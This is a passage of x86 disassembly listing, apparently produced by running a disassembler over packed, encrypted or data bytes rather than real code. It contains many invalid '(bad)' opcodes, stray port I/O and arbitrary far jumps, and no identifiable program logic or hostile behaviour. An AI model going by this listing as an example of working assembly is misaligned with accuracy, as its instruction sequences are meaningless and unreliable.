  426db9:	mov    eax,0x3262b2e4
  426dbe:	loopne 0x426e1c
  426dc0:	std    
  426dc1:	lods   al,BYTE PTR ds:[esi]
  426dc2:	pop    esi
  426dc3:	lds    ecx,FWORD PTR [esi]
  426dc5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426dc6:	aaa    
  426dc7:	enter  0xa6a7,0x58
  426dcb:	aas    
  426dcc:	repnz adc al,0xec
  426dcf:	test   DWORD PTR [ebx-0x4bf498a6],0xe7fd203b
  426dd9:	xor    DWORD PTR [edx+edi*8-0x7c],edi
  426ddd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426dde:	cmp    eax,0xa547f3a8
  426de3:	sbb    eax,0x7954d655
  426de8:	not    BYTE PTR [eax-0x30]
  426deb:	ficomp WORD PTR [edx]
  426ded:	rcr    DWORD PTR [ebx-0x20],0xf2
  426df1:	in     eax,dx
  426df2:	in     al,0xa5
  426df4:	iret   
  426df5:	aas    
  426df6:	in     eax,dx
  426df7:	adc    al,0x71
  426df9:	push   eax
  426dfa:	arpl   WORD PTR [edx+0x8],bp
  426dfd:	sbb    al,0xe5
  426dff:	dec    edi
  426e00:	fistp  WORD PTR [ebp+0x76]
  426e03:	inc    ebp
  426e04:	sbb    ch,BYTE PTR [ebx+0x32d4390f]
  426e0a:	push   0xd26920dd
  426e0f:	dec    ebp
  426e10:	inc    ebp
  426e11:	jl     0x426dcf
  426e13:	push   ds
  426e14:	and    DWORD PTR [ebx-0x28],0x3d
  426e18:	add    eax,DWORD PTR [edi-0x11]
  426e1b:	sub    eax,DWORD PTR [edi-0x41cc315b]
  426e21:	nop
  426e22:	xchg   DWORD PTR [ebx-0x355b16ce],edx
  426e28:	cwde   
  426e29:	mov    edx,ss
  426e2b:	jp     0x426e16
  426e2d:	sbb    al,0x1e
  426e2f:	(bad)  
  426e30:	ficomp DWORD PTR [eax+0x6]
  426e33:	arpl   bx,si
  426e35:	icebp  
  426e36:	and    al,0x54
  426e38:	lahf   
  426e39:	div    BYTE PTR [esi]
  426e3b:	arpl   WORD PTR [edx],bp
  426e3d:	or     dl,BYTE PTR [eax]
  426e3f:	add    al,0xfb
  426e41:	aaa    
  426e42:	adc    cl,BYTE PTR [esi]
  426e44:	int3   
  426e45:	adc    ah,ah
  426e47:	pop    ecx
  426e48:	hlt    
  426e49:	(bad)  
  426e4a:	add    BYTE PTR [ebp-0x6e],0xe7
  426e4e:	fs neg ecx
  426e51:	(bad)  
  426e52:	out    dx,eax
  426e53:	in     eax,dx
  426e54:	in     eax,0x7f
  426e56:	mov    esp,0x858fd296
  426e5b:	jmp    0x9a6d:0x5f3750d7
  426e62:	cmp    esi,edi
  426e64:	pop    esi
  426e65:	mov    edi,0x50ed0069
  426e6a:	lods   al,BYTE PTR ds:[esi]
  426e6b:	push   ebx
  426e6c:	mov    ds:0x8dce1a61,eax
  426e71:	mov    BYTE PTR [esi+ebx*1],cl
  426e74:	(bad)  
  426e75:	sub    ch,BYTE PTR [eax]
  426e77:	dec    esi
  426e78:	sbb    bh,BYTE PTR [eax+eax*8]
  426e7b:	imul   edi,DWORD PTR [ecx],0x8ab8ec36
  426e81:	loopne 0x426ee4
  426e83:	dec    ecx
  426e84:	and    eax,0x42bd99e5
  426e89:	out    dx,al
  426e8a:	ret    0xcd5
  426e8d:	push   ebp
  426e8e:	pushf  
  426e8f:	push   cs
  426e90:	mov    cl,0xf5
  426e92:	pusha  
  426e93:	(bad)  
  426e94:	sub    BYTE PTR [edi],bh
  426e96:	xchg   DWORD PTR [esi+0x201866d7],edi
  426e9c:	cli    
  426e9d:	jae    0x426e47
  426e9f:	pop    ss
  426ea0:	(bad)  
  426ea1:	repnz sbb dh,dl
  426ea4:	push   ebx
  426ea5:	fimul  WORD PTR [edi+eax*1-0x603ae858]
  426eac:	sbb    eax,0x7d621fdc
  426eb1:	push   0x139af5
  426eb6:	dec    esi
  426eb7:	(bad)  
  426eb8:	cmp    BYTE PTR [ebx-0x5],cl
  426ebb:	fs ins DWORD PTR es:[edi],dx
  426ebd:	lea    ebp,[edx]
  426ebf:	pop    edi
  426ec0:	(bad)  
  426ec1:	or     bl,BYTE PTR [edx-0x43]
  426ec4:	rcr    BYTE PTR [eax-0x6],1
  426ec7:	fdivr  QWORD PTR [esi+0x77]
  426eca:	cld    
  426ecb:	mov    al,ds:0xcf118d48
  426ed0:	mov    ds:0xcd3ec959,eax
  426ed5:	pop    ss
  426ed6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426ed7:	outs   dx,DWORD PTR gs:[esi]
  426ed9:	std    
  426eda:	fld    DWORD PTR [edx]
  426edc:	cmc    
  426edd:	push   ebx
  426ede:	and    al,BYTE PTR [ebp+0x3b6b6a5c]
  426ee4:	daa    
  426ee5:	gs push ss
  426ee7:	sbb    dl,dl
  426ee9:	jle    0x426ea5
  426eeb:	mov    ah,0xfb
  426eed:	ror    DWORD PTR [esi-0x172d8346],0x90
  426ef4:	es push cs
  426ef6:	push   edx
  426ef7:	shl    DWORD PTR [ebx-0xa],1
  426efa:	fldenv [ebp+0x32]
  426efd:	dec    esp
  426efe:	das    
  426eff:	mov    edi,ds
  426f01:	push   0xffffffe8
  426f03:	not    DWORD PTR [esi-0x64]
  426f06:	dec    edx
  426f07:	ror    BYTE PTR [esp+ebx*4-0x373a5344],1
  426f0e:	imul   BYTE PTR [ebx-0xdaca3b9]
  426f14:	inc    ebx
  426f15:	pop    esp
  426f16:	int    0x87
  426f18:	dec    BYTE PTR [edx+0x887d865]
  426f1e:	pop    ds
  426f1f:	xchg   ebx,eax
  426f20:	mov    ss,WORD PTR [ecx+0x6ab7e7cd]
  426f26:	xchg   edx,eax
  426f27:	ds xchg esi,eax
  426f29:	or     dh,BYTE PTR [esi]
  426f2b:	jne    0x426ef1
  426f2d:	ss xchg ebp,eax
  426f2f:	inc    eax
  426f30:	and    al,0x4f
  426f32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426f33:	test   BYTE PTR [ecx+0x4d],dh
  426f36:	mov    cl,0xd4
  426f38:	jmp    0x426fb0
  426f3a:	pop    esp
  426f3b:	fldlg2 
  426f3d:	imul   ecx,DWORD PTR [eax+0x26],0x32
  426f41:	dec    BYTE PTR [ebp+0x6a]
  426f44:	adc    esp,DWORD PTR [ebx-0x1fb4a25]
  426f4a:	ss (bad) 
  426f4c:	cmp    bl,bl
  426f4e:	call   0xf063ffaa
  426f53:	jnp    0x426f8b
  426f55:	sub    al,al
  426f57:	daa    
  426f58:	mov    dl,0xb
  426f5a:	je     0x426f71
  426f5c:	dec    ebx
  426f5d:	test   al,0x19
  426f5f:	pop    ecx
  426f60:	out    dx,al
  426f61:	(bad)  
  426f62:	cmp    BYTE PTR [ebx],bl
  426f64:	cwde   
  426f65:	iret   
  426f66:	push   0x5
  426f68:	xor    eax,0x523b3fd9
  426f6d:	fs mov dl,0xb6
  426f70:	pop    ebp
  426f71:	or     ah,bh
  426f73:	mov    ch,ch
  426f75:	retf   
  426f76:	mov    BYTE PTR [edx+0x50cf981d],ah
  426f7c:	mov    ds:0xe38b7bcb,eax
  426f81:	fwait
  426f82:	lods   al,BYTE PTR ds:[esi]
  426f83:	rcr    DWORD PTR [edi+0x16],1
  426f86:	push   ss
  426f87:	xchg   ebx,eax
  426f88:	or     eax,0xa0281e19
  426f8d:	jo     0x426f83
  426f8f:	pushf  
  426f90:	imul   esi,DWORD PTR [eax+esi*8-0x7c],0x4f
  426f95:	aas    
  426f96:	loope  0x42700b
  426f98:	dec    esi
  426f99:	in     al,0x50
  426f9b:	push   esp
  426f9c:	sbb    BYTE PTR [edi-0x18],dl
  426f9f:	mov    ah,0x4b
  426fa1:	mov    esp,esi
  426fa3:	nop
  426fa4:	pop    ds
  426fa5:	add    BYTE PTR [edi+ebx*2],al
  426fa8:	test   eax,0x7f6640af
  426fad:	mov    BYTE PTR [ecx+0x2c4cf091],0x8e
  426fb4:	or     bl,BYTE PTR cs:[ecx+0x2741a6c4]
  426fbb:	push   ebp
  426fbc:	pop    esi
  426fbd:	loopne 0x42701a
  426fbf:	ret    
  426fc0:	inc    eax
  426fc1:	mov    cl,0x1f
  426fc3:	in     al,dx
  426fc4:	inc    edx
  426fc5:	stos   DWORD PTR es:[edi],eax
  426fc6:	mov    bh,0x34
  426fc8:	xchg   edx,eax
  426fc9:	cli    
  426fca:	xor    eax,0x8dfae1f4
  426fcf:	out    dx,eax
  426fd0:	cmp    ecx,0x3995cc2e
  426fd6:	sbb    ebp,ebp
  426fd8:	xchg   ebx,eax
  426fd9:	sti    
  426fda:	sub    al,0x50
  426fdc:	jmp    0x427023
  426fde:	inc    bp
  426fe0:	stos   DWORD PTR es:[edi],eax
  426fe1:	and    ah,BYTE PTR [esi+0x7b]
  426fe4:	xchg   ecx,eax
  426fe5:	stos   BYTE PTR es:[edi],al
  426fe6:	jbe    0x42702b
  426fe8:	ins    DWORD PTR es:[edi],dx
  426fe9:	addr16 dec eax
  426feb:	pop    ds
  426fec:	icebp  
  426fed:	xor    ebp,esp
  426fef:	test   al,0xde
  426ff1:	sbb    eax,0xd94f3fb
  426ff6:	fnstenv [esi-0x34]
  426ff9:	lods   al,BYTE PTR ds:[esi]
  426ffa:	imul   esi,DWORD PTR ds:0xfd93,0x8247bc97
  427003:	dec    ecx
  427004:	mov    ch,0x52
  427006:	xchg   edi,eax
  427007:	dec    eax
  427008:	mov    edx,0xfcbd4fa6
  42700d:	jle    0x42708c
  42700f:	mov    ch,0x37
  427011:	add    BYTE PTR [ecx+0x123c6744],0xcc
  427018:	test   DWORD PTR [ebx-0x51],edi
  42701b:	aad    0x8e
  42701d:	hlt    
  42701e:	(bad)  
  42701f:	mov    ds:0x6612350b,al
  427024:	jecxz  0x427017
  427026:	mov    ebp,0xa262a8f3
  42702b:	cmp    ah,BYTE PTR [edx+esi*2-0x5ac2c252]
  427032:	mul    ebp
  427034:	jecxz  0x426fe7
  427036:	std    
  427037:	in     eax,dx
  427038:	pop    ecx
  427039:	push   ecx
  42703a:	pusha  
  42703b:	out    dx,al
  42703c:	jp     0x427006
  42703e:	mov    WORD PTR [ecx],es
  427040:	mov    ds,ebp
  427042:	mov    ebp,0x6046f177
  427047:	sub    al,0x92
  427049:	ret    
  42704a:	and    al,0x5
  42704c:	inc    edx
  42704d:	in     eax,dx
  42704e:	(bad)  
  42704f:	int3   
  427050:	jnp    0x427081
  427052:	adc    al,BYTE PTR [ebp+esi*2-0x59]
  427056:	and    al,0xad
  427058:	mov    ch,0x65
  42705a:	sub    DWORD PTR fs:[ebx+eax*1-0x57fd0d99],edi
  427062:	inc    ebp
  427063:	aad    0xe3
  427065:	push   edx
  427066:	sar    BYTE PTR [edi-0x202bf6b],cl
  42706c:	mov    ecx,0x2b5cee29
  427071:	rcr    BYTE PTR ds:0x9adbcff,1
  427077:	xor    eax,0x68bd85d2
  42707c:	imul   ecx,DWORD PTR [ebx+0x73],0x88a0dd48
  427083:	bound  ecx,QWORD PTR [esi-0x2accb4d7]
  427089:	xchg   ecx,eax
  42708a:	int    0x81
  42708c:	and    al,0xd6
  42708e:	jmp    0xabd3:0xad16ead5
  427095:	fwait
  427096:	sti    
  427097:	les    ecx,FWORD PTR [ebx+0x24]
  42709a:	stos   BYTE PTR es:[edi],al
  42709b:	repnz dec esp
  42709d:	xchg   ebp,eax
  42709e:	push   edx
  42709f:	popf   
  4270a0:	jb     0x42709a
  4270a2:	dec    edi
  4270a3:	adc    BYTE PTR ds:0xf04342e0,ah
  4270a9:	lds    esi,FWORD PTR [ebp+0x1f]
  4270ac:	pop    eax
  4270ad:	jne    0x427069
  4270af:	adc    eax,0x72e63a86
  4270b4:	adc    edi,eax
  4270b6:	jo     0x427102
  4270b8:	shr    DWORD PTR [ecx],1
  4270ba:	jg     0x427107
  4270bc:	pusha  
  4270bd:	test   BYTE PTR [ebp-0x796718c7],ch
  4270c3:	mov    ebx,0x4e293c9c
  4270c8:	iret   
  4270c9:	sbb    BYTE PTR [ebx],ch
  4270cb:	dec    ebx
  4270cc:	xor    DWORD PTR [eax+0x3b3b8b3],0x6b
  4270d3:	fs inc ebp
  4270d5:	and    BYTE PTR [edi+0x4bb8d29c],dh
  4270db:	dec    ecx
  4270dc:	out    0x18,eax
  4270de:	enter  0x242f,0x28
  4270e2:	dec    eax
  4270e3:	jae    0x427147
  4270e5:	push   esp
  4270e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4270e7:	pop    edx
  4270e8:	xor    edi,DWORD PTR [edi+edi*8]
  4270eb:	loop   0x427112
  4270ed:	jbe    0x4270a5
  4270ef:	daa    
  4270f0:	cmp    cl,BYTE PTR [ebx+ecx*1-0x1aa6e5c]
  4270f7:	(bad)  
  4270f8:	cmp    eax,0x28eb741a
  4270fd:	in     eax,0xed
  4270ff:	ins    BYTE PTR es:[edi],dx
  427100:	push   ax
  427102:	xor    DWORD PTR [ebp+0x1a32e6cf],esp
  427108:	aaa    
  427109:	ins    DWORD PTR es:[edi],dx
  42710a:	loopne 0x427166
  42710c:	ret    
  42710d:	dec    edx
  42710e:	push   ss
  42710f:	mov    bh,0xe0
  427111:	hlt    
  427112:	xor    ebx,DWORD PTR [eax-0x5a]
  427115:	sub    ecx,edi
  427117:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427118:	mov    ds:0x63efc57a,eax
  42711d:	xchg   esi,eax
  42711e:	(bad)  
  42711f:	shl    ch,1
  427121:	mov    eax,0xd3a5300
  427126:	pusha  
  427127:	daa    
  427128:	mov    bl,0x5c
  42712a:	mov    al,ds:0x5180725
  42712f:	cmc    
  427130:	jg     0x427190
  427132:	outs   dx,BYTE PTR ds:[esi]
  427133:	xchg   ebx,eax
  427134:	pop    ecx
  427135:	and    BYTE PTR [eax+edi*8+0x459ff819],cl
  42713c:	maxps  xmm3,XMMWORD PTR [ebx+0x1ca8f516]
  427143:	(bad)  
  427144:	in     al,0x1e
  427146:	mov    DWORD PTR [ecx],esp
  427148:	je     0x42714f
  42714a:	xor    eax,0x6e660a51
  42714f:	and    al,0xd8
  427151:	sub    BYTE PTR [eax+eiz*1],0xd6
  427155:	inc    ebp
  427156:	test   BYTE PTR [ebp-0x3b],0xdb
  42715a:	sar    BYTE PTR [ebx+eax*2],1
  42715d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42715e:	push   ss
  42715f:	stos   BYTE PTR es:[edi],al
  427160:	or     al,0xa4
  427162:	and    BYTE PTR [edx],al
  427164:	out    dx,eax
  427165:	push   ebx
  427166:	aas    
  427167:	pop    ebx
  427168:	das    
  427169:	sub    DWORD PTR ds:0xf266ef7c,ebp
  42716f:	xchg   esp,eax
  427170:	add    al,0xf2
  427172:	cmp    BYTE PTR [edx-0x7359d63f],cl
  427178:	xor    bh,BYTE PTR [edx+0xb81dba5]
  42717e:	dec    esi
  42717f:	xchg   esi,eax
  427180:	push   ss
  427181:	xor    BYTE PTR [ebx],ah
  427183:	jne    0x42716e
  427185:	add    ah,dl
  427187:	scas   al,BYTE PTR es:[edi]
  427188:	pop    ebx
  427189:	test   esi,esp
  42718b:	xchg   DWORD PTR [ecx],ecx
  42718d:	fidiv  WORD PTR [esi]
  42718f:	xor    al,0xee
  427191:	xchg   edx,eax
  427192:	not    BYTE PTR [eax-0x6af30d0d]
  427198:	mov    bh,0xa5
  42719a:	xchg   edx,eax
  42719b:	cmp    esp,DWORD PTR [edi]
  42719d:	mov    esp,0xc41a6757
  4271a2:	inc    ebx
  4271a3:	push   esi
  4271a4:	xor    esp,ebp
  4271a6:	mov    ch,0x96
  4271a8:	push   edx
  4271a9:	xchg   edx,eax
  4271aa:	xchg   esi,eax
  4271ab:	(bad)  
  4271ac:	jns    0x427150
  4271ae:	add    BYTE PTR [eax],al
  4271b0:	add    BYTE PTR [eax],al
  4271b2:	sub    eax,DWORD PTR [edi-0xc021e8b]
  4271b8:	mov    edi,0x7da68ccf
  4271bd:	inc    ecx
  4271be:	cmp    esi,esp
  4271c0:	idiv   BYTE PTR [edi+0x1e9d9]
  4271c6:	hlt    
  4271c7:	add    al,0x0
  4271c9:	add    BYTE PTR [esi-0x59386c38],dh
  4271cf:	inc    ebx
  4271d0:	int    0x82
  4271d2:	xor    ah,BYTE PTR [esi+0x6f]
  4271d5:	or     al,0x78
  4271d7:	std    
  4271d8:	addr16 loope 0x4271f0
  4271db:	cs xor dl,bh
  4271de:	add    eax,0xeb740134
  4271e3:	adc    eax,0x65fed942
  4271e8:	add    ah,cl
  4271ea:	cmp    DWORD PTR [eax-0x7f],0x22
  4271ee:	sub    ebx,DWORD PTR [ecx+ebx*4+0x3660b39a]
  4271f5:	mov    eax,0x3400e9cb
  4271fa:	lock out 0xbb,eax
  4271fd:	popf   
  4271fe:	hlt    
  4271ff:	mov    ch,0xa8
  427201:	xchg   ebp,eax
  427202:	sti    
  427203:	sbb    eax,0xf3010e46
  427208:	cli    
  427209:	xchg   esi,eax
  42720a:	pop    ss
  42720b:	pop    ss
  42720c:	rcr    BYTE PTR [esi+0x6e],1
  42720f:	and    eax,0x689a6568
  427214:	sub    DWORD PTR [esi],edi
  427216:	push   0xffffffdb
  427218:	pop    ecx
  427219:	cmp    BYTE PTR [esi-0x24],bh
  42721c:	cmp    bh,0x21
  42721f:	std    
  427220:	sub    al,0x7
  427222:	jne    0x4271bb
  427224:	or     DWORD PTR [ebx],edx
  427226:	loope  0x427240
  427228:	mov    esi,0x38ea981
  42722d:	aaa    
  42722e:	daa    
  42722f:	out    0x60,al
  427231:	add    eax,0x34df0aca
  427236:	mov    al,bl
  427238:	pop    ecx
  427239:	(bad)  
  42723a:	stos   DWORD PTR es:[edi],eax
  42723b:	sub    BYTE PTR ds:0xc85ab95c,ch
  427241:	inc    edx
  427242:	adc    ecx,DWORD PTR ds:0x4b111bb0
  427248:	fsub   QWORD PTR [eax+0x2d]
  42724b:	mov    cl,0xe8
  42724d:	gs cld 
  42724f:	add    bh,BYTE PTR [edi-0x69a3b453]
  427255:	loopne 0x427255
  427257:	push   es
  427258:	inc    esp
  427259:	jg     0x427251
  42725b:	sub    ebx,edi
  42725d:	jne    0x427248
  42725f:	push   ds
  427260:	jbe    0x4271ff
  427262:	pop    ebp
  427263:	cmp    BYTE PTR [ebp+0x13],ah
  427266:	cmc    
  427267:	sbb    esp,ebx
  427269:	xchg   DWORD PTR [esi],ebx
  42726b:	or     esp,eax
  42726d:	in     al,dx
  42726e:	repnz cmp edi,edx
  427271:	push   edi
  427272:	outs   dx,BYTE PTR ds:[esi]
  427273:	push   eax
  427274:	gs xchg esp,eax
  427276:	xchg   edi,eax
  427277:	test   al,0x41
  427279:	or     DWORD PTR [edi-0x526550ad],edx
  42727f:	and    BYTE PTR [ebx+0x29ace14d],ah
  427285:	rcr    DWORD PTR [eax-0x65b4d7ba],0x7c
  42728c:	jl     0x427301
  42728e:	in     eax,0xd7
  427290:	aam    0x28
  427292:	sub    DWORD PTR [esi],0x7f4b02a0
  427298:	jmp    0xd4acc35f
  42729d:	sbb    bl,bh
  42729f:	pop    ecx
  4272a0:	add    DWORD PTR [ebp+0x65],edi
  4272a3:	dec    ebp
  4272a4:	push   eax
  4272a5:	sbb    DWORD PTR [esi-0x10],ebp
  4272a8:	sub    al,0x6d
  4272aa:	aaa    
  4272ab:	or     ebx,ecx
  4272ad:	dec    ebp
  4272ae:	dec    ecx
  4272af:	outs   dx,BYTE PTR ds:[esi]
  4272b0:	(bad)  
  4272b1:	sar    DWORD PTR [ebp-0x22],cl
  4272b4:	mov    ds:0xf7c6548,eax
  4272b9:	xchg   ebp,eax
  4272ba:	outs   dx,DWORD PTR ds:[esi]
  4272bb:	mov    esp,0x6e1b9324
  4272c0:	out    0x31,al
  4272c2:	pop    esp
  4272c3:	mov    al,ds:0x50ebaff8
  4272c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4272c9:	push   ebp
  4272ca:	sbb    DWORD PTR [ebx-0x2495f1e3],ebp
  4272d0:	(bad)  
  4272d1:	popf   
  4272d2:	jns    0x427334
  4272d4:	stos   DWORD PTR es:[edi],eax
  4272d5:	call   0x2ba5:0xbd828264
  4272dc:	test   al,0x43
  4272de:	(bad)  
  4272e0:	inc    edi
  4272e1:	cli    
  4272e2:	ret    
  4272e3:	(bad)  
  4272e4:	xchg   ecx,eax
  4272e5:	fucomip st,st(7)
  4272e7:	pushf  
  4272e8:	add    DWORD PTR [ebx],esi
  4272ea:	outs   dx,DWORD PTR ds:[esi]
  4272eb:	scas   eax,DWORD PTR es:[edi]
  4272ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4272ed:	xor    cl,ch
  4272ef:	(bad)  
  4272f0:	fist   WORD PTR [edi+0x7a2e2f63]
  4272f6:	cld    
  4272f7:	xor    edx,esp
  4272f9:	adc    esp,DWORD PTR [edi]
  4272fb:	scas   eax,DWORD PTR es:[edi]
  4272fc:	adc    BYTE PTR [edx],0xa8
  4272ff:	lock test eax,0xc2513d62
  427305:	dec    esp
  427306:	mov    ah,0xf1
  427308:	ret    
  427309:	add    al,cl
  42730b:	lds    esi,FWORD PTR [ecx]
  42730d:	jmp    0x42735b
  42730f:	mov    bh,0x91
  427311:	add    edi,DWORD PTR [ebp+0x60918689]
  427317:	ret    
  427318:	sti    
  427319:	jnp    0x427350
  42731b:	cs inc esp
  42731d:	addr16 ror ecx,0x42
  427321:	data16 mov dh,0xda
  427324:	push   ecx
  427325:	mov    bh,0x90
  427327:	mov    ch,BYTE PTR [esi-0x13]
  42732a:	dec    eax
  42732b:	push   es
  42732c:	mov    ah,0x6a
  42732e:	mov    DWORD PTR [ebp+0x30],esp
  427331:	jp     0x427304
  427333:	pop    ebp
  427334:	emms   
  427336:	push   ebp
  427337:	jbe    0x427334
  427339:	loopne 0x4272f5
  42733b:	cmovg  eax,DWORD PTR [ebp+0x18]
  42733f:	mov    dh,dh
  427341:	ins    BYTE PTR es:[edi],dx
  427342:	xchg   ebx,eax
  427343:	or     BYTE PTR [ecx],0x79
  427346:	and    ebx,DWORD PTR [esi]
  427348:	ds dec eax
  42734a:	fnclex 
  42734c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42734d:	jl     0x4272d5
  42734f:	fmul   QWORD PTR [edx-0x71816f3b]
  427355:	cmp    eax,0xef15352
  42735a:	in     al,dx
  42735b:	sub    DWORD PTR [ebx],ecx
  42735d:	xor    al,0xe4
  42735f:	pop    ss
  427360:	test   BYTE PTR [ebp+0x4bbb3b26],dh
  427366:	mov    al,ds:0x8b5dc5ae
  42736b:	inc    eax
  42736c:	cmp    dh,bh
  42736e:	stos   DWORD PTR es:[edi],eax
  42736f:	pop    ebx
  427370:	ficom  WORD PTR [eax]
  427372:	into   
  427373:	pop    ds
  427374:	mov    ah,0xda
  427376:	xchg   esp,eax
  427377:	mov    ?,WORD PTR [edi]
  427379:	mov    WORD PTR [esi+0x38e6dce3],es
  42737f:	cmp    al,0x2b
  427381:	ins    BYTE PTR es:[edi],dx
  427382:	mov    esi,0xd882b1
  427387:	into   
  427388:	in     eax,0x24
  42738a:	or     DWORD PTR [esi-0x74e72c48],esp
  427390:	ins    DWORD PTR es:[edi],dx
  427391:	popa   
  427392:	jecxz  0x427330
  427394:	scas   al,BYTE PTR es:[edi]
  427395:	inc    ebx
  427396:	mov    eax,ds:0xd18af716
  42739b:	adc    al,0xea
  42739d:	mov    DWORD PTR [ebp-0x4c],esp
  4273a0:	ja     0x42738b
  4273a2:	jmp    0x6b3e0df
  4273a7:	es shl al,1
  4273aa:	mov    ah,ah
  4273ac:	xchg   ebx,eax
  4273ad:	add    ebp,edx
  4273af:	fsub   QWORD PTR [eax+0x26]
  4273b2:	sbb    edx,DWORD PTR [ebx+edi*2-0x67]
  4273b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4273b7:	jne    0x427379
  4273b9:	aad    0xc
  4273bb:	arpl   WORD PTR [eax+0x51eb9dfe],ax
  4273c1:	aam    0xc9
  4273c3:	lea    eax,ds:0x2ee49f3e
  4273c9:	jnp    0x4273ac
  4273cb:	adc    eax,0xf10cc442
  4273d0:	loop   0x427441
  4273d2:	mov    bl,0xd3
  4273d4:	out    0x29,al
  4273d6:	test   eax,0xa3b94607
  4273db:	push   0xe3e88da8
  4273e0:	ins    BYTE PTR es:[edi],dx
  4273e1:	fs clc 
  4273e3:	shl    DWORD PTR [edx-0x668b730a],1
  4273e9:	stos   BYTE PTR es:[edi],al
  4273ea:	jnp    0x4273cc
  4273ec:	jmp    0x427468
  4273ee:	(bad)  
  4273f0:	mov    al,ds:0xd1f564c3
  4273f5:	bound  esp,QWORD PTR [ecx-0x43]
  4273f8:	lods   eax,DWORD PTR ds:[esi]
  4273f9:	(bad)  
  4273fb:	push   0x791c9aa
  427400:	cli    
  427401:	and    bh,BYTE PTR [edx-0xa11ca07]
  427407:	in     eax,0x3a
  427409:	pop    ds
  42740a:	inc    esi
  42740b:	or     eax,0x4e35d8f6
  427410:	pushf  
  427411:	out    dx,eax
  427412:	call   FWORD PTR [edi]
  427414:	pop    ss
  427415:	and    ebp,ecx
  427417:	fdivr  QWORD PTR [ebx-0x56414bb8]
  42741d:	das    
  42741e:	mov    DWORD PTR [ebx-0x5f60dd3c],esi
  427424:	mov    al,ds:0x2aee8ba1
  427429:	retf   0x9c9c
  42742c:	scas   eax,DWORD PTR es:[edi]
  42742d:	mov    cl,0x92
  42742f:	test   eax,0x71ffd8d2
  427434:	mov    dh,0x6
  427436:	jne    0x4273c2
  427438:	sbb    edx,DWORD PTR [eax]
  42743a:	jne    0x427453
  42743c:	retf   
  42743d:	stc    
  42743e:	push   es
  42743f:	inc    ebx
  427440:	repnz mov ebp,0x40b0698f
  427446:	out    dx,al
  427447:	pop    eax
  427448:	sar    BYTE PTR [edi+0x18c62f9c],0x16
  42744f:	cmp    DWORD PTR [edi+edi*4],edx
  427452:	xchg   esi,eax
  427453:	add    BYTE PTR [esi-0x2417402b],bh
  427459:	mov    WORD PTR [edi],gs
  42745b:	je     0x4274bd
  42745d:	push   0x7fb3be6
  427462:	jo     0x42744c
  427464:	repnz repz pop edi
  427467:	xchg   ebp,eax
  427468:	lahf   
  427469:	sbb    al,0x3f
  42746b:	or     eax,0x59dc8466
  427470:	icebp  
  427471:	push   es
  427472:	das    
  427473:	mov    al,0x37
  427475:	imul   ebx,DWORD PTR [esi-0x5e4095b5],0x2e
  42747c:	repz cmp eax,0x67389d99
  427482:	mov    edi,0x84c861a7
  427487:	lds    ecx,FWORD PTR [esi+0x52d8496]
  42748d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42748e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42748f:	fldenv [edi-0x459814d8]
  427495:	dec    ebp
  427496:	sub    eax,0xbaaaf80a
  42749b:	dec    ebx
  42749c:	dec    ebp
  42749d:	adc    al,0x7c
  42749f:	cmp    dh,al
  4274a1:	or     DWORD PTR [ebx],ecx
  4274a3:	mov    ebp,0xd4ede33f
  4274a8:	or     al,0xfa
  4274aa:	xchg   esi,eax
  4274ab:	inc    eax
  4274ac:	out    0xa5,al
  4274ae:	ret    0x2ca6
  4274b1:	call   0x83f6:0x489067f2
  4274b8:	pushf  
  4274b9:	imul   eax,DWORD PTR [eax-0x1b0af7a],0x256c4dff
  4274c3:	push   0xffffffd3
  4274c5:	js     0x42750f
  4274c7:	and    DWORD PTR [ebx],esp
  4274c9:	retf   
  4274ca:	jo     0x42752f
  4274cc:	aaa    
  4274cd:	mov    ch,0x5f
  4274cf:	jae    0x4274ab
  4274d1:	mov    eax,0x59543648
  4274d6:	out    dx,al
  4274d7:	stos   DWORD PTR es:[edi],eax
  4274d8:	jns    0x427543
  4274da:	into   
  4274db:	xchg   esi,eax
  4274dc:	xor    eax,0x9486cad1
  4274e1:	cld    
  4274e2:	mov    ah,0x1b
  4274e4:	fadd   QWORD PTR [eax-0x6333f028]
  4274ea:	xchg   DWORD PTR [esi-0x68a78c03],edx
  4274f0:	xchg   ebx,eax
  4274f1:	in     eax,dx
  4274f2:	dec    edx
  4274f3:	mov    ebp,0x498047c5
  4274f8:	fstp   QWORD PTR [esi-0x11d6650]
  4274fe:	ss in  ax,0xb4
  427502:	popf   
  427503:	sub    eax,0x809b3d22
  427508:	dec    esi
  427509:	cli    
  42750a:	jmp    0xf0a4ab64
  42750f:	and    al,0x2a
  427511:	(bad)  
  427513:	(bad)  
  427514:	mov    esi,0x9d97586b
  427519:	cmp    DWORD PTR [edx+0x619b6f8b],edx
  42751f:	adc    eax,0x5c9f2c7
  427524:	retf   
  427525:	ins    BYTE PTR es:[edi],dx
  427526:	push   edx
  427527:	jo     0x4274e9
  427529:	stc    
  42752a:	cli    
  42752b:	test   eax,0xa326b624
  427530:	fstp   TBYTE PTR [eax-0x63ce5710]
  427536:	xchg   BYTE PTR [edx-0x7b9e450f],dl
  42753c:	sar    DWORD PTR [ebp+esi*4+0xecb0b1e],1
  427543:	push   ecx
  427544:	add    BYTE PTR [eax],cl
  427546:	dec    ecx
  427547:	das    
  427548:	gs jg  0x4274fe
  42754b:	fadd   QWORD PTR ds:0x9f211dea
  427551:	fld    QWORD PTR [ebp-0x27]
  427554:	in     al,0xb6
  427556:	add    al,0x45
  427558:	mov    edx,0x9836ef69
  42755d:	(bad)  
  42755e:	repnz pop ebp
  427560:	xor    ecx,DWORD PTR [edi+0xc6b8b26]
  427566:	nop
  427567:	inc    esp
  427568:	lock jo 0x4275a0
  42756b:	adc    DWORD PTR [esi],ebx
  42756d:	xchg   BYTE PTR [eax+0x18],bh
  427570:	push   esp
  427571:	out    0xc3,eax
  427573:	pop    es
